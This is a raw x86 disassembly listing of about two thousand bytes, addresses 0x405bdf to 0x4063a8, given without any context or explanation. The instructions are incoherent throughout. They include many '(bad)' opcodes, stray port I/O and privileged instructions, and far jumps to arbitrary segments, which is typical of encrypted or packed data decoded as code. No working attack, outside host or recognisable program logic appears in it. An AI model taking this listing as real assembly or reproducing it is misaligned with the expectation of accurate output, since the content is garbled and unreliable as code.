  405bdf:	test   al,0xae
  405be1:	xchg   esi,eax
  405be2:	loopne 0x405c5d
  405be4:	fnstsw WORD PTR [edx+0x51]
  405be7:	cdq    
  405be8:	js     0x405c36
  405bea:	ins    BYTE PTR es:[edi],dx
  405beb:	(bad)  [ebp+0xf]
  405bee:	in     eax,dx
  405bef:	fidivr WORD PTR [edi+0x58eda45a]
  405bf5:	lock fist DWORD PTR [ebp+edi*1-0x4e868161]
  405bfd:	ja     0x405b98
  405bff:	inc    eax
  405c00:	fisubr DWORD PTR [ebp+0x467f9f9a]
  405c06:	je     0x405bbe
  405c08:	mov    ecx,0xa298931e
  405c0d:	(bad)  
  405c0e:	lahf   
  405c0f:	stos   DWORD PTR es:[edi],eax
  405c10:	loop   0x405bcd
  405c12:	jnp    0x405c7d
  405c14:	bound  edi,QWORD PTR [eax-0x17]
  405c17:	test   BYTE PTR [ebp-0x5c],bl
  405c1a:	int3   
  405c1b:	jg     0x405c8c
  405c1d:	imul   ebx,ecx,0xffffffb9
  405c20:	add    ecx,0xffffff9e
  405c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c24:	adc    eax,0x55c8606e
  405c29:	clc    
  405c2a:	mov    al,ds:0xcaa3dfe7
  405c2f:	or     DWORD PTR [ebx+edx*4+0x8],edx
  405c33:	stos   BYTE PTR es:[edi],al
  405c34:	xor    BYTE PTR [edi+0x1a9e4a5],bl
  405c3a:	sub    bh,dl
  405c3c:	mov    eax,ds:0x121fcbad
  405c41:	add    al,BYTE PTR [ebx]
  405c43:	std    
  405c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c45:	pop    edx
  405c46:	iret   
  405c47:	or     DWORD PTR ds:0x54d19005,0xffffffef
  405c4e:	mov    ?,ecx
  405c50:	mov    dh,0x9d
  405c52:	rcr    esp,cl
  405c54:	jnp    0x405c4f
  405c56:	cld    
  405c57:	retf   0xfb10
  405c5a:	sub    eax,0x894b1307
  405c5f:	and    BYTE PTR [ebx],bl
  405c61:	fcomp  DWORD PTR [edi]
  405c63:	and    ebx,0x36
  405c66:	into   
  405c67:	add    ebp,0x8297d62c
  405c6d:	pop    esi
  405c6e:	sub    bl,0x7e
  405c71:	js     0x405c77
  405c73:	ins    BYTE PTR es:[edi],dx
  405c74:	cmp    ebp,DWORD PTR [edx+0x441c2e6b]
  405c7a:	cld    
  405c7b:	xor    DWORD PTR [edx],ebx
  405c7d:	dec    esp
  405c7e:	in     eax,dx
  405c7f:	dec    ebp
  405c80:	cdq    
  405c81:	out    dx,al
  405c82:	dec    esi
  405c83:	rol    BYTE PTR [ecx-0x7d469e78],0xe2
  405c8a:	icebp  
  405c8b:	push   ss
  405c8c:	arpl   WORD PTR [edx+0x16],bx
  405c8f:	repz inc esp
  405c91:	push   edx
  405c92:	(bad)  
  405c93:	aas    
  405c94:	dec    ebx
  405c95:	dec    ch
  405c97:	dec    ebp
  405c98:	push   edx
  405c99:	jns    0x405c99
  405c9b:	cmp    al,0x64
  405c9d:	sbb    BYTE PTR [ebx],dl
  405c9f:	xlat   BYTE PTR ds:[ebx]
  405ca0:	cs or  eax,0xc15830ad
  405ca6:	stos   BYTE PTR es:[edi],al
  405ca7:	push   cs
  405ca8:	jecxz  0x405c6f
  405caa:	stc    
  405cab:	sub    eax,0xce238317
  405cb0:	fucom  st(1)
  405cb2:	sbb    esp,eax
  405cb4:	sub    al,0x90
  405cb6:	cmp    BYTE PTR [edi+0x75],dl
  405cb9:	sahf   
  405cba:	pop    ebx
  405cbb:	mov    al,0xa2
  405cbd:	out    dx,eax
  405cbe:	mov    edx,DWORD PTR [ebx-0x61]
  405cc1:	sub    al,0x44
  405cc3:	pop    es
  405cc4:	mov    DWORD PTR [edx-0x7],edi
  405cc7:	mov    BYTE PTR [edi+0x1],ah
  405cca:	fcom   DWORD PTR [ecx+edx*4]
  405ccd:	scas   al,BYTE PTR es:[edi]
  405cce:	in     al,0x90
  405cd0:	jmp    0xb3b07eaf
  405cd5:	outs   dx,BYTE PTR ds:[esi]
  405cd6:	leave  
  405cd7:	sub    BYTE PTR [ecx-0x110eb010],bh
  405cdd:	les    edx,FWORD PTR [ebp-0x12]
  405ce0:	push   edi
  405ce1:	or     cl,BYTE PTR [edx-0x1fded490]
  405ce7:	aad    0xbc
  405ce9:	loope  0x405d16
  405ceb:	(bad)  
  405cec:	fistp  DWORD PTR [esi-0x62]
  405cef:	mov    al,0x5e
  405cf1:	iret   
  405cf2:	nop
  405cf3:	sub    BYTE PTR [eax-0x261d9fba],al
  405cf9:	pop    ebx
  405cfa:	pop    ebp
  405cfb:	add    eax,0xdc5f05bd
  405d01:	inc    ebx
  405d02:	(bad)  
  405d03:	pop    edx
  405d04:	out    dx,eax
  405d05:	(bad)  
  405d06:	jl     0x405c95
  405d08:	and    al,0xfd
  405d0a:	sbb    edx,DWORD PTR [edi]
  405d0c:	mov    al,ds:0x2f1dfd34
  405d11:	adc    dl,BYTE PTR [edi-0x2d]
  405d14:	mov    dl,0x7
  405d16:	and    BYTE PTR [edx],0x97
  405d19:	shl    DWORD PTR [eax+esi*8+0x52f554f],1
  405d20:	loopne 0x405d21
  405d22:	lods   eax,DWORD PTR ds:[esi]
  405d23:	cmp    al,0x92
  405d25:	sbb    bh,BYTE PTR [esi+0x46]
  405d28:	(bad)  
  405d2a:	pop    ecx
  405d2b:	xor    esp,DWORD PTR [ebp-0x23e49ea5]
  405d31:	jb     0x405cd3
  405d33:	popf   
  405d34:	in     eax,0x90
  405d36:	out    dx,eax
  405d37:	adc    al,0x68
  405d39:	lahf   
  405d3a:	jo     0x405cd4
  405d3c:	mov    ebp,0x131c2637
  405d41:	cmp    al,0xd2
  405d43:	arpl   WORD PTR [ecx+edi*1-0x1],bp
  405d47:	jmp    0x6442:0xf19f28e2
  405d4e:	jecxz  0x405d3d
  405d50:	mov    dl,0xa7
  405d53:	das    
  405d54:	push   esi
  405d55:	aas    
  405d56:	enter  0xdc2d,0xd2
  405d5a:	push   es
  405d5b:	mov    ds:0x6bb01f53,eax
  405d60:	and    eax,0xa91248a1
  405d65:	cmp    BYTE PTR [eax-0x6e],bl
  405d68:	daa    
  405d69:	(bad)  
  405d6a:	fdiv   st,st(5)
  405d6c:	push   ebx
  405d6d:	mov    dh,0x59
  405d6f:	fwait
  405d70:	inc    esi
  405d71:	int    0x91
  405d73:	retf   
  405d74:	pop    es
  405d75:	xor    eax,0x4cb419e6
  405d7a:	es (bad) 
  405d7d:	or     eax,DWORD PTR [ebp+0x23]
  405d80:	gs push 0x4e
  405d83:	cmp    edx,0xffffffae
  405d86:	dec    edx
  405d87:	stc    
  405d88:	push   ss
  405d89:	inc    ebp
  405d8a:	call   0x9372a3d1
  405d8f:	inc    ebp
  405d90:	mov    bl,0xb7
  405d92:	add    al,0xb9
  405d94:	cmp    eax,0xb9e0ef02
  405d99:	cld    
  405d9a:	gs scas al,BYTE PTR es:[edi]
  405d9c:	cmp    ecx,DWORD PTR [esi+ebx*4-0x6ad4d44b]
  405da3:	mov    al,ds:0x794f0c11
  405da8:	push   ecx
  405da9:	ja     0x405e29
  405dab:	in     eax,0x55
  405dad:	mov    esp,DWORD PTR [ecx+0x1e7853a1]
  405db3:	or     al,0xbf
  405db5:	push   edx
  405db6:	aad    0x75
  405db8:	loopne 0x405d79
  405dba:	(bad)  [ecx]
  405dbc:	lds    eax,FWORD PTR [edx+eiz*2]
  405dbf:	ins    DWORD PTR es:[edi],dx
  405dc0:	mov    cl,0xfb
  405dc2:	dec    edx
  405dc3:	sar    BYTE PTR [edx-0xe801fcd],0xe8
  405dca:	cli    
  405dcb:	xchg   ebp,edx
  405dcd:	sti    
  405dce:	and    ah,ah
  405dd0:	cmp    BYTE PTR [ecx+edi*8+0x46],dh
  405dd4:	mov    DWORD PTR [esi+eiz*1],eax
  405dd7:	pop    edx
  405dd8:	ds sub ebp,0xad787a46
  405ddf:	sahf   
  405de0:	sti    
  405de1:	add    edx,esp
  405de3:	sar    DWORD PTR [edi+eax*8+0x7a],cl
  405de7:	xor    BYTE PTR [eax],0x60
  405dea:	out    dx,al
  405deb:	retf   0xcd8
  405dee:	mov    ss:0x4523dde1,al
  405df4:	scas   al,BYTE PTR es:[edi]
  405df5:	loope  0x405d96
  405df7:	xchg   BYTE PTR [ebp+0x328d337e],ch
  405dfd:	jb     0x405e14
  405dff:	jns    0x405dce
  405e01:	sar    DWORD PTR [ecx-0x19a44907],1
  405e07:	dec    edx
  405e08:	adc    eax,0x4411b216
  405e0d:	call   0x20c19c72
  405e12:	aad    0xa1
  405e14:	pop    ss
  405e15:	(bad)  
  405e16:	pop    ecx
  405e17:	dec    ecx
  405e18:	pop    eax
  405e19:	int    0xbe
  405e1b:	cwde   
  405e1c:	mov    ebp,0xf664f026
  405e21:	mov    ecx,0xf4db7c8f
  405e26:	dec    ebp
  405e27:	fsub   DWORD PTR [ebp+0x11]
  405e2a:	(bad)  
  405e2b:	into   
  405e2c:	mov    bh,0x20
  405e2e:	rcr    DWORD PTR [ecx+ecx*8],1
  405e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e32:	add    esp,ebx
  405e34:	pop    ecx
  405e35:	(bad)  
  405e36:	xor    edi,DWORD PTR [ebx-0x295b0251]
  405e3c:	mov    ah,0x4e
  405e3e:	xor    al,BYTE PTR [edi]
  405e40:	and    dl,BYTE PTR [ecx]
  405e42:	retf   
  405e43:	jnp    0x405e7c
  405e45:	inc    ecx
  405e46:	mov    edi,0xb208382f
  405e4b:	mov    ebx,0x3afe6196
  405e50:	sbb    ebx,edx
  405e52:	jo     0x405e5b
  405e54:	jns    0x405e09
  405e56:	push   es
  405e57:	ret    
  405e58:	aas    
  405e59:	mov    BYTE PTR [ecx+ebp*1-0x3d],bh
  405e5d:	loop   0x405e37
  405e5f:	jno    0x405e92
  405e61:	mov    ch,0x63
  405e63:	adc    DWORD PTR ds:0x64c128b4,esi
  405e69:	push   es
  405e6a:	mov    ecx,edi
  405e6c:	in     al,0xd
  405e6e:	push   ds
  405e6f:	sbb    bh,ch
  405e71:	xor    al,bl
  405e73:	div    DWORD PTR [esi+0x5d]
  405e76:	ins    BYTE PTR es:[edi],dx
  405e77:	leave  
  405e78:	test   al,0x4b
  405e7a:	xchg   DWORD PTR [edi+0x64585489],edi
  405e80:	cwde   
  405e81:	pop    es
  405e82:	mov    BYTE PTR [edi-0x57],0xc2
  405e86:	jg     0x405e4a
  405e88:	mov    DWORD PTR [ebx],ebx
  405e8a:	pop    ss
  405e8b:	mov    dl,ch
  405e8d:	xchg   ebp,eax
  405e8e:	ret    0x6028
  405e91:	push   ecx
  405e92:	jg     0x405ec0
  405e94:	dec    edx
  405e95:	ins    DWORD PTR es:[edi],dx
  405e96:	mov    dl,0xd8
  405e98:	add    al,0xb1
  405e9a:	fs dec edx
  405e9c:	test   eax,0xf250d8b0
  405ea1:	add    ebp,DWORD PTR ds:0xe09701d7
  405ea7:	ret    0x347d
  405eaa:	add    BYTE PTR fs:[ebx+ebp*8-0x6e],bl
  405eaf:	pop    ebx
  405eb0:	std    
  405eb1:	mov    eax,ds:0xb2c93150
  405eb6:	scas   eax,DWORD PTR es:[edi]
  405eb7:	iret   
  405eb8:	adc    BYTE PTR [edi+edi*8],dh
  405ebb:	cmp    ecx,DWORD PTR ds:[eax-0x26d406d5]
  405ec2:	mov    edi,0x880b7a06
  405ec7:	(bad)  
  405ec8:	xlat   BYTE PTR ds:[ebx]
  405ec9:	cmp    eax,0x170bc352
  405ece:	jnp    0x405e61
  405ed0:	ror    BYTE PTR [edi-0x7a],1
  405ed3:	dec    ecx
  405ed4:	clc    
  405ed5:	xchg   esi,eax
  405ed6:	mov    edx,ecx
  405ed8:	fwait
  405ed9:	arpl   WORD PTR [ebx],cx
  405edb:	imul   esp,esi,0x46398e72
  405ee1:	pop    esp
  405ee2:	sub    al,0x6f
  405ee4:	mov    esi,0x1e51db7d
  405ee9:	add    BYTE PTR [ecx+0x38],ah
  405eec:	push   ss
  405eed:	hlt    
  405eee:	icebp  
  405eef:	cmp    DWORD PTR [ebp-0x2c202d30],edx
  405ef5:	cwde   
  405ef6:	int3   
  405ef7:	es (bad) 
  405ef9:	shl    BYTE PTR [esi-0x3],1
  405efc:	test   BYTE PTR ds:0xb04cf03f,dh
  405f02:	mov    bl,0x4c
  405f04:	xchg   DWORD PTR [esi+0x5c],ebp
  405f07:	or     eax,DWORD PTR [esi-0x3045d00f]
  405f0d:	pop    esi
  405f0e:	sub    DWORD PTR [edx],esp
  405f10:	and    ecx,esi
  405f12:	jbe    0x405f8c
  405f14:	(bad)
  405f18:	mov    ds:0xfbcbbde1,al
  405f1d:	adc    eax,0x2a2d9b77
  405f22:	sub    esp,DWORD PTR [edx+0x4f]
  405f25:	xchg   edx,eax
  405f26:	aaa    
  405f27:	fwait
  405f28:	std    
  405f29:	fwait
  405f2a:	std    
  405f2b:	dec    eax
  405f2c:	data16 and BYTE PTR [ebp+ebx*8+0x7d9e583],ah
  405f34:	test   DWORD PTR [ecx+esi*8],edi
  405f37:	aam    0xb4
  405f39:	push   ss
  405f3a:	int    0x2f
  405f3c:	jmp    0x27a1b185
  405f41:	cmp    BYTE PTR ds:0xb2123cbc,dh
  405f47:	icebp  
  405f48:	fist   WORD PTR [ebx+0x5a]
  405f4b:	sbb    ecx,ebx
  405f4d:	pop    eax
  405f4e:	(bad)  
  405f4f:	arpl   dx,bp
  405f51:	jl     0x405f52
  405f53:	inc    edx
  405f54:	xchg   edi,eax
  405f55:	inc    ebx
  405f56:	arpl   cx,di
  405f58:	push   ecx
  405f59:	or     edx,DWORD PTR [eax+0x7b]
  405f5c:	lock ret 0xc062
  405f60:	inc    edi
  405f61:	daa    
  405f62:	inc    esi
  405f63:	dec    esi
  405f64:	shl    DWORD PTR [eax],0xe1
  405f67:	inc    ebx
  405f68:	cmp    BYTE PTR [ecx+0x64],0xc9
  405f6c:	mov    ebp,0x8561b44
  405f71:	test   eax,0xdc6548ba
  405f76:	and    eax,0x194d32b
  405f7b:	les    esi,FWORD PTR [edx]
  405f7d:	(bad)  
  405f7f:	lds    edi,FWORD PTR [ebp-0x52]
  405f82:	lea    esp,[eax+edi*8+0x11]
  405f86:	cmc    
  405f87:	wbinvd 
  405f89:	push   cs
  405f8a:	push   0x9eb85132
  405f8f:	ins    BYTE PTR es:[edi],dx
  405f90:	aas    
  405f91:	and    BYTE PTR [ebx+0x698ed368],al
  405f97:	fadd   st,st(0)
  405f99:	jmp    0xc435:0x96c9038b
  405fa0:	cmp    eax,0xb3f52c38
  405fa5:	popf   
  405fa6:	or     dh,BYTE PTR ds:0x860a1b59
  405fac:	rol    DWORD PTR [ecx-0x43c7180f],1
  405fb2:	push   es
  405fb3:	mov    BYTE PTR [ecx],dl
  405fb5:	sbb    edx,DWORD PTR [ecx+0x9]
  405fb8:	mov    cl,0x67
  405fba:	dec    edi
  405fbb:	fwait
  405fbc:	mov    edi,0x37b8fb2d
  405fc1:	pop    ebp
  405fc2:	out    0xb6,al
  405fc4:	dec    ecx
  405fc5:	scas   eax,DWORD PTR es:[edi]
  405fc6:	add    al,BYTE PTR [edi]
  405fc8:	xor    eax,0x6985e82e
  405fcd:	outs   dx,BYTE PTR ds:[esi]
  405fce:	iret   
  405fcf:	mov    al,0x67
  405fd1:	jnp    0x406040
  405fd3:	cli    
  405fd4:	jae    0x405ff4
  405fd6:	addr16 shr ch,1
  405fd9:	pop    esi
  405fda:	pop    ds
  405fdb:	jbe    0x405fda
  405fdd:	sbb    esp,esp
  405fdf:	(bad)  
  405fe0:	nop
  405fe1:	shl    DWORD PTR [ebp+0x33],0x7e
  405fe5:	fisttp QWORD PTR [ebx]
  405fe7:	xchg   esp,eax
  405fe8:	sti    
  405fe9:	mov    ecx,0xbcc02336
  405fee:	mov    ds:0x681df185,eax
  405ff3:	aam    0x2f
  405ff5:	mov    edx,0x7ec8c0a1
  405ffa:	cwde   
  405ffb:	mov    esi,DWORD PTR [ecx]
  405ffd:	imul   edi,DWORD PTR [edx],0x80bffcf8
  406003:	outs   dx,DWORD PTR ds:[esi]
  406004:	popf   
  406005:	mov    ah,0xb5
  406007:	mov    eax,0x251d2704
  40600c:	ins    BYTE PTR es:[edi],dx
  40600d:	xchg   ebx,eax
  40600e:	neg    BYTE PTR [ecx]
  406010:	jl     0x406072
  406012:	inc    edx
  406013:	das    
  406014:	(bad)  
  406015:	ja     0x405fee
  406017:	mov    al,0xb1
  406019:	int3   
  40601a:	les    ebx,FWORD PTR [ebp-0x7b153491]
  406020:	in     eax,dx
  406021:	push   cs
  406022:	mov    cl,0x3
  406024:	std    
  406025:	imul   esp,DWORD PTR [eax],0x9efc3a4
  40602b:	je     0x40605b
  40602d:	dec    ebx
  40602e:	sbb    ch,BYTE PTR [edx]
  406030:	outs   dx,BYTE PTR ds:[esi]
  406031:	shl    DWORD PTR [edi*8+0xce7fbee],0xb
  406039:	hlt    
  40603a:	dec    esi
  40603b:	and    ebx,DWORD PTR [edx+eax*8+0x30236df4]
  406042:	jnp    0x40600f
  406044:	pop    esp
  406045:	mov    edi,0xc1f06e00
  40604a:	cdq    
  40604b:	lahf   
  40604c:	dec    ecx
  40604d:	adc    DWORD PTR [ecx],esi
  40604f:	cmp    eax,0x66f69db7
  406054:	test   BYTE PTR [edi-0x39],dh
  406057:	cs (bad) 
  406059:	jne    0x4060c1
  40605b:	(bad)  
  40605c:	ds pop ebp
  40605e:	loopne 0x406050
  406060:	and    DWORD PTR [edi],edx
  406062:	dec    edx
  406063:	into   
  406064:	imul   ecx,DWORD PTR [ebp+0x6d],0x61
  406068:	mov    edx,0x98e69059
  40606d:	pop    edx
  40606e:	push   edi
  40606f:	xor    al,0x9b
  406071:	(bad)  
  406072:	rcl    BYTE PTR [eax-0x54be0402],cl
  406078:	scas   al,BYTE PTR es:[edi]
  406079:	scas   eax,DWORD PTR es:[edi]
  40607a:	sbb    eax,0xc2a2da35
  40607f:	stc    
  406080:	aas    
  406081:	or     al,0xf5
  406083:	sbb    dl,BYTE PTR gs:[ecx-0x6d]
  406087:	stos   BYTE PTR es:[edi],al
  406088:	sub    eax,0xc5e2f3ba
  40608d:	cli    
  40608e:	pop    edi
  40608f:	dec    edx
  406090:	iret   
  406091:	fsub   DWORD PTR [ecx+0xe32ffd0]
  406097:	pop    ebp
  406098:	or     edi,DWORD PTR [edx]
  40609a:	mov    ds:0xf7168f10,eax
  40609f:	xor    dl,ah
  4060a1:	xchg   ebp,eax
  4060a2:	xchg   DWORD PTR [esi-0x65a18af5],ebp
  4060a8:	add    eax,0x7525f48b
  4060ad:	jmp    0x4060fd
  4060af:	packssdw xmm7,XMMWORD PTR [ebx]
  4060b3:	cmc    
  4060b4:	enter  0x17bb,0x9d
  4060b8:	lock pop edi
  4060ba:	aam    0x8e
  4060bc:	push   esp
  4060bd:	into   
  4060be:	add    bl,BYTE PTR [eax]
  4060c0:	arpl   WORD PTR [edi-0x5bb207e4],bx
  4060c6:	repnz and DWORD PTR [eax+0x67],ebx
  4060ca:	add    dh,BYTE PTR [edx]
  4060cc:	pop    esp
  4060cd:	mov    ds:0x1313f497,eax
  4060d2:	enter  0x58ce,0xc4
  4060d6:	mov    dl,0x17
  4060d8:	shr    ah,cl
  4060da:	sub    DWORD PTR [edi+0x47d2d617],0xfffffffd
  4060e1:	mov    edi,0x99659f46
  4060e6:	xchg   esi,eax
  4060e7:	dec    eax
  4060e8:	xchg   esi,eax
  4060e9:	sbb    al,0x3c
  4060ec:	rol    DWORD PTR [ecx-0x2e],cl
  4060ef:	sbb    eax,0xf384e49
  4060f5:	ja     0x406169
  4060f7:	inc    esp
  4060f8:	lds    edx,FWORD PTR [ebx+0x1f]
  4060fb:	sbb    ebx,DWORD PTR ds:0x38b9238a
  406101:	mov    ah,0x28
  406103:	dec    esi
  406104:	dec    edi
  406105:	inc    ebp
  406106:	jg     0x406176
  406108:	push   ss
  406109:	add    eax,0x5630023b
  40610e:	or     al,0xbf
  406110:	cld    
  406111:	in     al,0x5a
  406113:	cmp    BYTE PTR [edx],dl
  406115:	pop    esi
  406116:	mov    eax,0xe28cd96
  40611b:	dec    esi
  40611c:	inc    edx
  40611d:	sbb    eax,0xede35894
  406122:	cmp    al,BYTE PTR [edi-0xe]
  406125:	aad    0x15
  406127:	stos   BYTE PTR es:[edi],al
  406128:	adc    dl,BYTE PTR [esi+ebp*8]
  40612b:	or     al,0x7f
  40612d:	(bad)  
  40612e:	adc    al,BYTE PTR [ecx-0x3b0b8d26]
  406134:	popa   
  406135:	fbld   TBYTE PTR ds:0x80650ae
  40613b:	outs   dx,DWORD PTR ds:[esi]
  40613c:	pushf  
  40613d:	adc    BYTE PTR ds:[edx-0x2f],ah
  406141:	mov    eax,ds:0x44194344
  406146:	inc    edi
  406147:	aam    0x93
  406149:	xor    eax,0x368c1c70
  40614e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40614f:	sbb    eax,0x6fec4534
  406154:	loop   0x4060da
  406156:	fbstp  TBYTE PTR [esi]
  406158:	or     BYTE PTR ds:0x401577a8,0xb0
  40615f:	xor    BYTE PTR [ebx],al
  406161:	bswap  edx
  406163:	in     al,dx
  406164:	xor    ecx,ebp
  406166:	std    
  406167:	and    al,0xc
  406169:	pop    ss
  40616a:	adc    al,0xff
  40616c:	in     eax,0x8b
  40616e:	nop
  40616f:	(bad)  
  406170:	inc    esp
  406171:	jbe    0x4060fd
  406173:	scas   al,BYTE PTR es:[edi]
  406174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406175:	cmp    eax,0x3e39750a
  40617a:	div    DWORD PTR [eax+0x404e8e0a]
  406180:	and    BYTE PTR [ebp+edx*8+0x25557239],0x90
  406188:	repz in eax,0x42
  40618b:	jns    0x40614c
  40618d:	push   ebp
  40618e:	in     eax,dx
  40618f:	addr16 jbe 0x4061e7
  406192:	or     al,0xee
  406194:	mov    ?,WORD PTR [ebp+0x1b9e94e9]
  40619a:	cmp    ah,dh
  40619c:	popa   
  40619d:	mov    bh,0x74
  40619f:	mov    DWORD PTR [ebx+edx*4],eax
  4061a2:	fwait
  4061a3:	scas   al,BYTE PTR es:[edi]
  4061a4:	xchg   edx,eax
  4061a5:	int    0x3
  4061a7:	mov    edx,0x310a1402
  4061ac:	inc    ecx
  4061ad:	loope  0x406229
  4061af:	push   esp
  4061b0:	shr    ah,0xe6
  4061b3:	and    BYTE PTR [edi+0x54],0xd2
  4061b7:	or     DWORD PTR [edx+0x65],esp
  4061ba:	in     eax,0x29
  4061bc:	cmp    eax,0xea3a7a1b
  4061c1:	pop    eax
  4061c2:	scas   al,BYTE PTR es:[edi]
  4061c3:	mov    dl,0x69
  4061c5:	ja     0x40617a
  4061c7:	mov    esi,0xe41bc84d
  4061cc:	cdq    
  4061cd:	dec    eax
  4061ce:	cmc    
  4061cf:	mov    ebp,esp
  4061d1:	repz jecxz 0x406181
  4061d4:	cmp    ebx,ebp
  4061d6:	jmp    0xc4e8:0x76e4dcd0
  4061dd:	adc    eax,0x8d01f973
  4061e2:	push   ecx
  4061e3:	ja     0x406222
  4061e5:	mov    edx,0xee832880
  4061ea:	imul   esi,DWORD PTR [ebx],0x73e8a5f9
  4061f0:	xchg   ecx,eax
  4061f1:	stos   BYTE PTR es:[edi],al
  4061f2:	loopne 0x40617b
  4061f4:	imul   edx,eax,0xffffffa8
  4061f7:	leave  
  4061f8:	jne    0x40625f
  4061fa:	or     BYTE PTR [edi],ah
  4061fc:	and    DWORD PTR [edx+0x6],0x2d
  406200:	cmc    
  406201:	add    DWORD PTR [ebx],edx
  406203:	subps  xmm4,xmm7
  406206:	jnp    0x40623e
  406208:	pop    edx
  406209:	mov    ebx,0x9e2f38a4
  40620e:	mov    dh,0xd7
  406210:	test   BYTE PTR [eax+0x3a4ba6b7],al
  406216:	lahf   
  406217:	push   cs
  406218:	out    dx,al
  406219:	arpl   WORD PTR [edx+ebp*1],ax
  40621c:	or     esp,DWORD PTR [edi-0x5c]
  40621f:	lods   eax,DWORD PTR ds:[esi]
  406220:	aas    
  406221:	repz jmp 0x919b0308
  406227:	push   esp
  406228:	dec    edi
  406229:	sub    ah,BYTE PTR [ebx]
  40622b:	mov    eax,0x6019ebf9
  406230:	callw  0xc6b7
  406234:	add    esp,eax
  406236:	mov    DWORD PTR [eax+0x15218679],esi
  40623c:	jl     0x40628b
  40623e:	and    esi,eax
  406240:	jno    0x4062a1
  406242:	inc    eax
  406243:	bound  edx,QWORD PTR [ecx+0x484285a8]
  406249:	push   ds
  40624a:	push   esi
  40624b:	cld    
  40624c:	rcr    DWORD PTR [eax],0xe0
  40624f:	adc    al,0xf4
  406252:	cmp    edi,0x67
  406255:	mov    ss,edx
  406257:	xchg   BYTE PTR [esp+eax*2+0x60],al
  40625b:	inc    ecx
  40625c:	pop    ebx
  40625d:	cld    
  40625e:	es mov cl,0x7d
  406261:	aam    0x6b
  406263:	pop    ebx
  406264:	es xor al,0xa5
  406267:	ins    BYTE PTR es:[edi],dx
  406268:	bound  eax,QWORD PTR [esp+eax*1-0x71]
  40626c:	xchg   DWORD PTR [edx+edx*4],edx
  40626f:	repz fmul QWORD PTR [ebx]
  406272:	mov    edx,eax
  406274:	dec    ebp
  406275:	mov    ah,0x1f
  406277:	mov    ecx,DWORD PTR [ebx+0x1]
  40627a:	jns    0x40624d
  40627c:	popa   
  40627d:	jle    0x40625a
  40627f:	mov    edi,0xcc488111
  406284:	mov    dl,ah
  406286:	lods   al,BYTE PTR ds:[esi]
  406287:	scas   eax,DWORD PTR es:[edi]
  406288:	test   BYTE PTR [edi+eiz*8],dl
  40628b:	push   ecx
  40628c:	sub    al,0xdf
  40628e:	mov    cl,0xb7
  406290:	xor    eax,0xe00493dd
  406295:	jns    0x4062e4
  406297:	arpl   WORD PTR [esi+0x15c28db1],bp
  40629d:	shl    DWORD PTR [ecx+eax*1+0x30041706],1
  4062a4:	add    al,0xa0
  4062a6:	xchg   esi,eax
  4062a7:	cmp    eax,eax
  4062a9:	and    eax,0x26f45aaa
  4062ae:	mov    dl,0x65
  4062b0:	xor    esp,ebx
  4062b2:	mov    ds:0x4903b4ad,al
  4062b7:	test   DWORD PTR [ebx-0x48f31a95],eax
  4062bd:	sbb    DWORD PTR [ebx],ecx
  4062bf:	and    eax,0x64c0ea86
  4062c4:	inc    edx
  4062c5:	mov    edx,0xaeedb037
  4062ca:	sub    eax,0x6c1f4e7c
  4062cf:	cmp    BYTE PTR [eax+0xfd38453],al
  4062d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d6:	(bad)  
  4062d8:	(bad)  
  4062d9:	ror    BYTE PTR [edi-0x7d98ca43],1
  4062df:	mov    bl,0x7a
  4062e1:	call   0x74a6:0x2e8810d0
  4062e8:	js     0x406365
  4062ea:	sub    DWORD PTR [edi+0x36eaed3f],edi
  4062f0:	aaa    
  4062f1:	out    dx,eax
  4062f2:	inc    esp
  4062f3:	add    al,0xcd
  4062f6:	dec    edi
  4062f7:	add    ah,BYTE PTR [edi+0x70]
  4062fa:	xlat   BYTE PTR ds:[ebx]
  4062fb:	fs inc esp
  4062fd:	xchg   BYTE PTR [edi+eiz*2],ah
  406300:	pop    esi
  406301:	dec    ebx
  406302:	dec    ebx
  406303:	dec    esp
  406304:	je     0x40631c
  406306:	sub    BYTE PTR [edi],ah
  406308:	xchg   esp,eax
  406309:	mov    esi,0xe498e312
  40630e:	mov    dh,0x89
  406310:	push   edx
  406311:	xor    BYTE PTR ds:0xc93b8e9,bl
  406317:	inc    eax
  406318:	pusha  
  406319:	xor    esi,edi
  40631b:	adc    ebx,DWORD PTR [edx-0x4b]
  40631e:	mov    ?,WORD PTR [edi]
  406320:	or     DWORD PTR [esi+0x7b],ebp
  406323:	cmp    BYTE PTR [ebp+0xa8e7aba],al
  406329:	test   DWORD PTR [edi+0x1b246cea],ebx
  40632f:	xchg   esp,eax
  406330:	jb     0x4062e4
  406332:	retf   0x2b80
  406335:	shr    BYTE PTR gs:[eax-0x7270421b],cl
  40633c:	lds    ebx,FWORD PTR [eax-0x61]
  40633f:	out    dx,eax
  406340:	cdq    
  406341:	fdiv   st(7),st
  406343:	in     al,dx
  406344:	call   0x5084:0x6efc10c2
  40634b:	jmp    0xfdb9:0x546b2e34
  406352:	je     0x40638e
  406354:	xor    bl,bl
  406356:	cmp    eax,0x7c3c9e5c
  40635b:	dec    ebx
  40635c:	aaa    
  40635d:	call   0x51942299
  406362:	stos   BYTE PTR es:[edi],al
  406363:	nop
  406364:	lea    ebp,[edx-0xa07ebf7]
  40636a:	in     al,dx
  40636b:	es (bad) 
  40636d:	lods   eax,DWORD PTR ds:[esi]
  40636e:	dec    ebx
  40636f:	mov    ah,0xfd
  406371:	dec    ecx
  406372:	inc    esp
  406373:	jo     0x406310
  406375:	jns    0x406348
  406377:	inc    edx
  406378:	div    DWORD PTR [edi-0x3a]
  40637b:	dec    eax
  40637c:	lods   eax,DWORD PTR ds:[esi]
  40637d:	repnz (bad) 
  40637f:	or     ecx,eax
  406381:	pusha  
  406382:	dec    esi
  406383:	add    ebp,ebp
  406385:	add    DWORD PTR [edi],edx
  406387:	push   ebx
  406388:	cmp    ah,BYTE PTR [ecx]
  40638a:	xchg   edi,eax
  40638b:	inc    edx
  40638c:	iret   
  40638d:	repnz (bad) 
  40638f:	retf   0xfcef
  406392:	cs inc edx
  406394:	cmc    
  406395:	ror    DWORD PTR [eax+0x66fd9d4a],cl
  40639b:	jmp    0xae96761b
  4063a0:	lods   al,BYTE PTR ds:[esi]
  4063a1:	jmp    0x97edc4c4
  4063a6:	and    al,0x10
  4063a8:	test   DWORD PTR [eax-0x6a],edi
